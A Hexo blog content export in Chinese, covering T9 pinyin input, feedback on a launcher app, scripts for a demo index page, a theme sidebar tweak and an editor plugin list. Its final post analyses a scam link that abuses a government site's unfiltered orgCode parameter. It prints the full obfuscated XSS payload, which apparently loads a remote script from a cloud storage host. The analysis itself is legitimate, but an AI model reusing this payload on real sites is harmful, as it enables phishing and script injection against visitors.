class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;w&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;小&quot;</span><span class="punctuation">,</span><span class="string">&quot;行&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;y&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;银&quot;</span><span class="punctuation">,</span><span class="string">&quot;一&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;支&quot;</span><span class="punctuation">,</span><span class="string">&quot;走&quot;</span><span class="punctuation">,</span><span class="string">&quot;只&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意 Pinyin [ <strong>h</strong> ] 和 Pinyin [ <strong>x</strong> ] 中都有 [ <strong>行</strong> ]</p>
+</blockquote>
+<hr>
+<h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><p>_<a href="/demo/demos/JS-T9输入法/" target="_blank" style="color:blue">T9 Demo</a> _</p>
+<h4 id="库"><a href="#库" class="headerlink" title="库"></a>库</h4><p>如果你需要的话</p>
+<ul>
+<li>_<a href="/demo/demos/JS-T9输入法/lib/T9_pinyin_tbl.js" target="_blank" style="color:blue">Pinyin and T9num</a> _</li>
+<li>_<a href="/demo/demos/JS-T9输入法/lib/T9_pinyin_short.js" target="_blank" style="color:blue">T9</a> _<br>(也许不全)</li>
+</ul>
+<hr>
+<h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><h4 id="精简"><a href="#精简" class="headerlink" title="精简"></a>精简</h4><h5 id="UI-Del①②③-1"><a href="#UI-Del①②③-1" class="headerlink" title="UI Del①②③"></a>UI Del①②③</h5><p><img src="/2016/06/02/study/other/Re-AppSwap/aw_s1_ui.jpg" alt="aw_s1_ui"><br>标准模式大而全，迷你模式我认为应该更快速，更精简，将一些不常用的删除。<br>①②③ 都可以取消。<br>① 的使用率太低了却占用了一个很重要的位置，很少有应用是全字符的。而且通过匹配应用名中其他拉丁字母或者更改应用别名来取代 ① 的作用。</p>
+<p>我不认为会有很多应用名字全为</p>
+<blockquote>
+<p>×&amp;#@$</p>
+</blockquote>
+<hr>
+<p>而如果应用名字是</p>
+<blockquote>
+<p>App ! Name #^&amp;</p>
+</blockquote>
+<p>我们也可以通过 <em>App</em> 或者 <em>Name</em> 来匹配。</p>
+<hr>
+<p>如果应用名为</p>
+<blockquote>
+<p>A!p#p$N*a!m&amp;e</p>
+</blockquote>
+<p>我想没人喜欢这样的名字，而且我们可以通过 App Swap 中修改应用的显示名为</p>
+<blockquote>
+<p>AppName</p>
+</blockquote>
+<hr>
+<p>把 ② 换到 ① 的位置将 ③ 删除，迷你模式将变成这样。<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_s1_ui_min.jpg" alt="aw_s1_ui_min"></p>
+<p>这时候 T9 数字刚好对应上方的应用图标，可以通过长按或者滑动 T9 数字来快速启动应用</p>
+<hr>
+<p>我想你可以通过以下应用获得更轻的想法</p>
+<p><em><a href="https://play.google.com/store/apps/details?id=name.pilgr.appdialer" title="AppDialer">AppDialer</a></em></p>
+<p>和更快的算法<br><em><a href="https://github.com/pilgr/Paper">https://github.com/pilgr/Paper</a></em></p>
+<hr>
+<h4 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h4><p><img src="/2016/06/02/study/other/Re-AppSwap/aw_l1.jpg" alt="aw_l1"><br>首页下拉出现的输入法 应该和启动时打开的键盘相同，由设置中决定。</p>
+<hr>
+<p><img src="/2016/06/02/study/other/Re-AppSwap/aw_l2.jpg" alt="aw_l2"><br>在绿色区域向<strong>上</strong>滑动时 黄色区域<strong>隐藏</strong><br>在绿色区域向<strong>下</strong>滑动时 黄色区域<strong>显示</strong></p>
+<hr>
+<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p><img src="/2016/06/02/study/other/Re-AppSwap/aw_o1.jpg" alt="aw_o1"><br>给应用分类真是个麻烦的事情。<br>如果可以通过 Navo Launch 导入将是个美好的事情。</p>
+<hr>
+<h3 id="BUG-1"><a href="#BUG-1" class="headerlink" title="BUG"></a>BUG</h3><h4 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h4><ul>
+<li>App Swap 1.00.468</li>
+<li>Nexus 5</li>
+<li>Andriod 5.1.1</li>
+</ul>
+<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol>
+<li><p>T9 模式下，拼音筛选无法使用删除键。<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q0.gif" alt="aw_q0"></p>
+</li>
+<li><p>我不知道这两个选项如何生效，或者说没有效果？<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q1.jpg" alt="aw_q1"></p>
+</li>
+<li><p>捐赠乱码<br>这个也许是我 ROM 字体不全<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q2.jpg" alt="aw_q2"></p>
+</li>
+<li><p>T9 模式下，Pinyin 无法从中间开始匹配</p>
+</li>
+<li><p>迷你模式绿色区域向上滑动无法显示更 duo 应用<br><img src="/2016/06/02/study/other/Re-AppSwap/aw_q3.jpg" alt="aw_q3"></p>
+</li>
+</ol>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>非常感谢您的应用让安卓更美好，如果有任何问题请回复我的邮箱，我将尽力解答。</p>
+<script src="jquery.min.js"></script>
+<script>
+$(function(){
+var olvandel = $(".nav:eq(0)");
+olvandel.parent().append(olvandel.children());
+olvandel.remove();
+var olnavfirst = $(".nav-level-2>ol");
+olnavfirst.attr("class","nav");
+$("h2").addClass("blockquote-center");
+});
+</script>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>other</category>
+      </categories>
+      <tags>
+        <tag>T9</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Dome 首页的优化</title>
+    <url>/2016/07/02/study/web/Dome-%E9%A6%96%E9%A1%B5%E7%9A%84%E4%BC%98%E5%8C%96/</url>
+    <content><![CDATA[<p>由于整站是放在 Github 上的静态页，那么没有后端的支持，页面的更新就是个麻烦事了。例如 Demo 的首页。如果纯静态，做完 Demo 然后还要去 Demo 首页写 DOM ，问题是如果写错还要回来更新…… 我这么懒，这费力不讨好的事我可不做。为了改进这个缺陷，陆陆续续有了这 3 个版本的更新。</p>
+<span id="more"></span>
+
+<h3 id="Version-1"><a href="#Version-1" class="headerlink" title="Version 1"></a>Version 1</h3><p>这个版本主要解决有没有的问题，先把主体框架搞定。最大的麻烦还是配色，考虑到主要入口是简历的 More ，最后要死要活还是和简历的风格搭上了。花了一天时间就在改这几个 8 位的 HEX …… 除了练车，这应该是我做过第二没效率的事了。</p>
+<p>接下来就是处理列表。现学的 JS 肯定不行，Google 一堆大神整天都在防着 Chrome 访问本地文件，靠我这技术现在肯定是没法，很自然的想到用批处理 – BAT，通过间接的创建本地目录的 XML，通过 ajax 调用达到目的。 说起来惭愧，从我开始用 Windows 就一直在用批处理，却一直没掌握循环 &#x3D;。&#x3D;～ 又是一阵折腾，把目录的 XML 结构搞定。剩下的就是 ajax 读 XML ，然后嵌套一个同步的 ajax 读每个 Demo 的 readme.md ， 最后处理字符串，插入 DOM。</p>
+<p>第一个版本搞定，我的 Demo 有首页啦！</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off&amp;setlocal enabledelayedexpansion</span><br><span class="line"><span class="built_in">cd</span> demos</span><br><span class="line"><span class="built_in">echo</span> ^&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;GB18030&quot;</span>?^&gt;&gt;list.xml</span><br><span class="line"><span class="built_in">echo</span> ^&lt;urls^&gt;&gt;&gt;list.xml</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;delims=&quot;</span> %%i <span class="keyword">in</span> (<span class="string">&#x27;dir /a-d/b /AD&#x27;</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;tt=%%i&quot;</span></span><br><span class="line"><span class="built_in">set</span> tt=!tt:\=/!</span><br><span class="line"><span class="built_in">echo</span> ^&lt;url^&gt;!tt!^&lt;^/url^&gt;&gt;&gt;list.xml)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> ^&lt;^/urls^&gt;&gt;&gt;list.xml</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr/>
+
+<h3 id="Version-2"><a href="#Version-2" class="headerlink" title="Version 2"></a>Version 2</h3><p>随着 Demo 越来越多，版本 1 暴露的问题就越来越多了。上一版的主体结构：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ajax &#123;</span><br><span class="line">	…………</span><br><span class="line">	<span class="attr">success</span>: <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    	ajax&#123;</span><br><span class="line">        	<span class="attr">async</span>: <span class="literal">false</span>,</span><br><span class="line">       		<span class="attr">success</span>: <span class="title function_">fn</span>(<span class="params"></span>)&#123;</span><br><span class="line">        		读取 readme.<span class="property">md</span></span><br><span class="line">        	&#125;</span><br><span class="line">        &#125;<span class="comment">//ajax 读取readme.md 结束  </span></span><br><span class="line">        …………</span><br><span class="line">        拼接插入<span class="variable constant_">DOM</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>首先就是页面内容空白，读取 readme.md 导致大量的 HTTP 请求，虽然已经更换到 HK 服务器，但近 20 条的 HTTP 请求直接导致页面空白近 10s ，并且没有任何暗示页面还在加载中，这是致命的。迫使我继续改进本地的 list 。再次使用 BAT 把 readme.md 写入 list 虽然是可行的，试着琢磨下还是觉得太笨，先不说对象那么多的 引号 调试过程中多容易出错，光读 readme.md 然后分段取值就够麻烦的了。想想还是用 JS 实现吧。 读取版本 1 中的 list， 然后再循环读取 readme.md 分段取值后创建对象，输出到窗口中，再人肉写入新的 list, 这样相当于把 readme.md 的 HTTP 那段在本地完成了，不过多了一步人肉 COPY 的过程……</p>
+<p>最后加上 CSS 的 loadding 动画，这次的改进让 Demo 至少能让人看到了。</p>
+<p>chrome 3G 模式载入时间缩小到 7s 左右。</p>
+<hr/>
+
+<h3 id="Version-3"><a href="#Version-3" class="headerlink" title="Version 3"></a>Version 3</h3><p>果然我是没耐性的，重复无意义的劳动做了几次就不爽了，人肉 COPY 这事闹心～ 而且现在我知道了 nodeJs 。学的 JavaScrip 终于能用在本地了。T.T 起初一切都很顺利，除了学习 改造 npm 和 fs API 的时间，几乎是一口气就写完了。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="comment">//var lineReader = require(&#x27;E:/nodejs/glob/npm/node_modules/line-reader&#x27;);</span></span><br><span class="line"><span class="keyword">var</span> lineReader = <span class="built_in">require</span>(<span class="string">&#x27;line-reader&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> dir = <span class="string">&quot;./demos/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> list = &#123;&#125;;</span><br><span class="line">fs.<span class="title function_">readdir</span>(dir, <span class="keyword">function</span> (<span class="params">err, files</span>) &#123;</span><br><span class="line">    <span class="comment">// 构建 list 主体分类</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = files.<span class="property">length</span> - <span class="number">1</span>; i &gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (files[i].<span class="title function_">indexOf</span>(<span class="string">&quot;.&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            files.<span class="title function_">splice</span>(i, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> _key = files[i].<span class="title function_">split</span>(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (list[_key] == <span class="literal">undefined</span>) &#123;</span><br><span class="line">                list[_key] = [];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">getFile</span>(files[i], list[_key]); <span class="comment">//自己一边玩去吧</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//读取readme详细内容填充list</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getFile</span>(<span class="params">fDir, lsAy</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> file = dir + fDir + <span class="string">&quot;/readme.md&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> wArry = <span class="string">&quot;&quot;</span></span><br><span class="line">        lineReader.<span class="title function_">eachLine</span>(file, <span class="keyword">function</span> (<span class="params">line, last</span>) &#123;</span><br><span class="line">            wArry = line.<span class="title function_">split</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            obj.<span class="property">name</span> = fDir;</span><br><span class="line">            obj.<span class="property">title</span> = wArry[<span class="number">0</span>];</span><br><span class="line">            obj.<span class="property">cont</span> = wArry[<span class="number">1</span>];</span><br><span class="line">            lsAy.<span class="title function_">push</span>(obj);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// stop reading</span></span><br><span class="line">        &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> listAll = <span class="string">&quot;var list = &quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(list);</span><br><span class="line">fs.<span class="title function_">writeFile</span>(dir + <span class="string">&quot;list.js&quot;</span>, listAll, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;write JSON into TEXT&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+<p>可最后输出死活是空…… 我都开始怀疑人生了。逐步排查后才发现 nodeJs 是异步的！ 特们都是基于 JS 构建的，跑到后端你就变成异步的啦？ 变得这么快，尼玛能认出你不…… 解决这个异步可真是伤脑筋，首先 这么小的东西不想用模块，却又没找到什么好办法。</p>
+<ul>
+<li>循环中写计数器，主代码最后写个 while 死循环等待，不知道为什么行不通。而且这也是治标不治本，耗电。</li>
+<li>不用函数，代码又太笨～<br>而且我这是 异步 套着 异步， 早不知飞哪去了…… 最后还是简单粗暴加个 setTimeOut 先跑着，看看啥时候再灵光一现再来解决。</li>
+</ul>
+<p>然后就是 Demo 首页的 JS 逻辑，根据之前 画廊 - Demo 的教训，Dom 的操作非常耗时，这次也直接改成字符串模板替换后插入 DOM 。</p>
+<p>Chrome 3G 模式 2s 完全载入，并且主要耗时是 JQuery 和字体的下载，基本彻底解决了载入的性能问题。</p>
+<hr/>
+
+<h3 id="next"><a href="#next" class="headerlink" title="next"></a>next</h3><p>可能下一个版本还要改下主体，虽然现在主体有个样子，不过空间浪费严重，并且没有突出重点，也不够炫。</p>
+<p>目前有个想法是书本，其中 HTML JS 等作为书页的贴纸标签，前面的目录会有黄色小星星标记出重点，每次随机翻到某一详细页，每次都有惊喜。应该还会把时间加进去，大概是按时间倒序。这样比较菜的东西会在后面，不过详细页就比较麻烦，空白太多还没想好怎么补。而且逻辑太多应该学完框架再去做会比较简单吧。</p>
+<h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>简历是发了，今天逛 V 站看见有个娃也是前端求职，内容嘛…… 基本是照着我求职的帖子写的。简历的跳转以及说明还有网址都是～ 最后点进去看简历，连 CSS 的 loading 动画都是…… 我用动画是为了掩盖，你这单页纯静态的加一个 loading……<br>不过也说明我做的东西还是有人认可的，有意思～</p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>为侧边栏增加自动隐藏</title>
+    <url>/2016/05/29/study/web/%E4%B8%BA%E4%BE%A7%E8%BE%B9%E6%A0%8F%E5%A2%9E%E5%8A%A0%E8%87%AA%E5%8A%A8%E9%9A%90%E8%97%8F/</url>
+    <content><![CDATA[<p>原版中，侧边栏只会在进入文章时显示，但如果文章看完后返回顶部并不会隐藏。虽然从实际角度出发并无大碍，多数看完文章就X了，可就是看着不顺眼，强迫症犯了然后……一晚上没了 T.T</p>
+<p>去官网文档并没有找到关于文件结构的相关说明，便从网页开始逆向，从 <em>ClassName 、ID</em>  等关键词搜寻本地文件内容。傻逼样的 Windows 是根据后缀来判断是否搜索文件内容， 虽然是用纯文本写的 <em>.swig</em> 直接被无视了。想用批处理来批量转换.TXT再用Windows搜素，此处浪费一小时～搜了个能搜索自定义文件名纯文本内容的软件几分钟解决…… 真爱生命，少造轮子 〒▽〒</p>
+<span id="more"></span>
+
+<p>后面还有一堆坑，不想说了……</p>
+<p>CSS JS 等源文件目录</p>
+<blockquote>
+<p>Hexo\themes\next\source</p>
+</blockquote>
+<h5 id="HTML-结构部分"><a href="#HTML-结构部分" class="headerlink" title="HTML 结构部分"></a>HTML 结构部分</h5><p>主题的_config.yml参数和以下文件共同控制。<br>&gt; Hexo\themes\next\layout_macro\sidebar.swig</p>
+<blockquote>
+<p>  sidebar:    display: hide  </p>
+</blockquote>
+<h5 id="函数部分"><a href="#函数部分" class="headerlink" title="函数部分"></a>函数部分</h5><p>这部分关联文件很多，主要是通过<br>&gt; Hexo\themes\next\source\js\src\post-details.js<br>这个文件中最后一段</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable constant_">CONFIG</span>.<span class="property">sidebar</span>.<span class="property">display</span> === <span class="string">&#x27;post&#x27;</span> || <span class="variable constant_">CONFIG</span>.<span class="property">sidebar</span>.<span class="property">display</span> === <span class="string">&#x27;always&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($tocContent.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; $tocContent.<span class="title function_">html</span>().<span class="title function_">trim</span>().<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title class_">NexT</span>.<span class="property">utils</span>.<span class="title function_">displaySidebar</span>();        </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>如果主题文件中<em>sidebar</em>为 post 或者 always 则会在页面载入后触发一次* NexT.utils.displaySidebar()* ，这个函数在<br>&gt; Hexo\themes\next\source\js\src\utils.js<br>中有体现。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">NexT</span>.<span class="property">utils</span> = <span class="title class_">NexT</span>.<span class="property">$u</span> = &#123;</span><br><span class="line">*****</span><br><span class="line"> <span class="attr">displaySidebar</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="title function_">isDesktop</span>() || <span class="variable language_">this</span>.<span class="title function_">isPisces</span>()) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&#x27;.sidebar-toggle&#x27;</span>).<span class="title function_">trigger</span>(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">*****</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据作者其他函数的书写习惯，顺藤摸瓜查找类似以下的函数</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;.sidebar-toggle&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;);</span><br></pre></td></tr></table></figure>
+<p>但这个函数细节始终没有找到。埋下最大一个坑。<br>开始觉得只要主题中设置为 <em>.hide</em> 后，在 <em>post-details.js</em> 最后添加以下函数即可</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> ($(<span class="variable language_">document</span>).<span class="title function_">scrollTop</span>() &gt; <span class="number">200</span> &amp;&amp; $(<span class="string">&quot;#sidebar&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>) == <span class="string">&quot;none&quot;</span>) &#123;</span><br><span class="line">             <span class="title class_">NexT</span>.<span class="property">utils</span>.<span class="title function_">displaySidebar</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> ($(<span class="variable language_">document</span>).<span class="title function_">scrollTop</span>() &lt;= <span class="number">200</span> &amp;&amp; $(<span class="string">&quot;#sidebar&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>) == <span class="string">&quot;block&quot;</span>) &#123;</span><br><span class="line">             <span class="title class_">NexT</span>.<span class="property">utils</span>.<span class="title function_">displaySidebar</span>();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);<span class="comment">//结束</span></span><br></pre></td></tr></table></figure>
+<p>在最顶部测试</p>
+<blockquote>
+<p>(document).scrollTop()  &lt;&#x3D; 200<br><strong>ture</strong></p>
+</blockquote>
+<blockquote>
+<p>$(“#sidebar”).css(“display”) &#x3D;&#x3D; “none”<br><strong>ture</strong></p>
+</blockquote>
+<blockquote>
+<p>($(document).scrollTop() &lt;&#x3D; 200 &amp;&amp; $(“#sidebar”).css(“display”)<br><strong>false</strong></p>
+</blockquote>
+<p>尼玛坑爹啊！  (╯°Д°)╯︵ ┻━┻<br>主要是因为触发的是模拟点击函数，并非直接操作侧边栏的动画。因此会有两者同步运行所产生的各种闪跳等BUG…… 找不到点击函数的情况下只得不断缩小 <em>if</em> 范围，缩小 显示&#x2F;隐藏 两者同时运行的概率，最后写成了这样的巨无霸</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 下滑动右侧显示，上滑动右侧隐藏</span></span><br><span class="line">   $(<span class="string">&quot;#sidebar&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">   <span class="keyword">var</span> a = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">   $(<span class="variable language_">document</span>).<span class="title function_">scroll</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//if (($(document).scrollTop() &gt; 300) &amp;&amp; ($(&quot;#sidebar&quot;).css(&quot;display&quot;) == &quot;none&quot;)) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (($(<span class="variable language_">document</span>).<span class="title function_">scrollTop</span>() &gt; <span class="number">200</span>) &amp;&amp; ($(<span class="string">&quot;#sidebar&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>) == <span class="string">&quot;none&quot;</span>) &amp;&amp; $(<span class="string">&quot;.back-to-top-on&quot;</span>).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="title class_">NexT</span>.<span class="property">utils</span>.<span class="title function_">displaySidebar</span>();</span><br><span class="line">            a = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;<span class="comment">//大于 显示</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//else if (($(document).scrollTop() &lt;= 10) &amp;&amp; ($(&quot;#sidebar&quot;).css(&quot;display&quot;) == &quot;block&quot;)) &#123;</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (($(<span class="variable language_">document</span>).<span class="title function_">scrollTop</span>() &lt;= <span class="number">200</span>) &amp;&amp; ($(<span class="string">&quot;#sidebar&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>) == <span class="string">&quot;block&quot;</span>) &amp;&amp; $(<span class="string">&quot;.back-to-top-on&quot;</span>).<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (a == <span class="string">&quot;0&quot;</span>) &#123;</span><br><span class="line">                <span class="title class_">NexT</span>.<span class="property">utils</span>.<span class="title function_">displaySidebar</span>();</span><br><span class="line">                a = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">            &#125; <span class="comment">//小于 隐藏</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);<span class="comment">//结束</span></span><br></pre></td></tr></table></figure>
+<p>我知道肯定能精简…… 搞不下去了～<br>等会如果上传到主站如果还有BUG….. 我特么会疯的……</p>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>收工了-Brackets</title>
+    <url>/2016/06/07/study/web/%E6%94%B6%E5%B7%A5%E4%BA%86-Brackets/</url>
+    <content><![CDATA[<p>今天休息，<em>工欲善其事，必先利其器</em>。调教了 Brackets 一天，总算是把平时不顺手的地方七七八八补全了。</p>
+<div class="blockquote-center">
+<img src="/2016/06/07/study/web/%E6%94%B6%E5%B7%A5%E4%BA%86-Brackets/desktop.jpg" class="">
+<b>一图流</b>
+</div>
+<br/>
+
+<span id="more"></span>
+
+<p>插件列表，留个底～</p>
+<ul>
+<li>beautify.io</li>
+<li>Brackets CSS Class Code hint</li>
+<li>Brackets Outline List</li>
+<li>CSSLint</li>
+<li>Emmet</li>
+<li>File Navigation Shortcuts</li>
+<li>Firewatch</li>
+<li>Hide Working Files</li>
+<li>Highlight variables in your code.</li>
+<li>JavaScript Globals</li>
+<li>Smooth Scroll</li>
+<li>Spacegray-Brackets</li>
+<li>Tabs - Custom Working</li>
+<li>Theseus for Brackets</li>
+</ul>
+]]></content>
+      <categories>
+        <category>study</category>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>tools</tag>
+        <tag>brackets</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>政务网漏洞</title>
+    <url>/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>朋友圈看到有骗人分享，链接是 <code>gov.cn</code>，通过政务网做跳板，绕过微信备案风控。</p>
+<p><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/1.jpg" alt="朋友圈"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>抓包溯源链接为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=%22%3B%7D%29%25%318%3Bi2%3D%27bjk%27%3Ba%3D%7B%27l%27%3Athis%2C%27k%27%3A%27%5C163etTimeout%27%2C%27r%27%3A%27a%27%2C%27t%27%3A%27%5C164o%5C142%27%7D%3Ba.l%5Ba.k%5D%28a.l%5Ba.r%2Ba.t%5D%28i2%2B%279ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8%2Fd3g9Jyk%3D%27%2C1%29%29%25%318%3B%24%28function%28%29%20%7Bvar%20orgCode%20%3D%20%22&amp;gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>decodeURIComponent</code> 获取得</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`https://xxxxxxxxx.gov.cn/jxzw/ncBmCity/getNcBmIndex.do?orgCode=&quot;;&#125;)%18;i2=&#x27;bjk&#x27;;a=&#123;&#x27;l&#x27;:this,&#x27;k&#x27;:&#x27;\\163etTimeout&#x27;,&#x27;r&#x27;:&#x27;a&#x27;,&#x27;t&#x27;:&#x27;\\164o\\142&#x27;&#125;;a.l[a.k](a.l[a.r+a.t](i2+&#x27;9ZG9jdW1lbnQNCm45LmRvY3VtZW50RWxlbWVudC5oaWRkZW49JzEnDQpuOS50aXRsZT0nTG9hZGluZy4uLicNCmltcG9ydCgnLy92MmxvYWQub3NzLWNuLXNoYW5naGFpLmFsaXl1bmNzLmNvbS9oejE1LmpzPz8/d3g9Jyk=&#x27;,1))%18;$(function() &#123;var orgCode = &quot;&amp;gdohll=cd1c3558c715249c11286cba506430c183efe2fcabf30dddaeff81be20aa1713abf60d#1680926768635`</span><br></pre></td></tr></table></figure>
+
+<p>一眼 <code>orgCode</code> 接口未限制，可以任意执行 js。</p>
+<p><img src="/2023/05/22/study/web/%E6%94%BF%E5%8A%A1%E7%BD%91%E6%BC%8F%E6%B4%9E/2.jpg" alt="漏洞发现"></p>
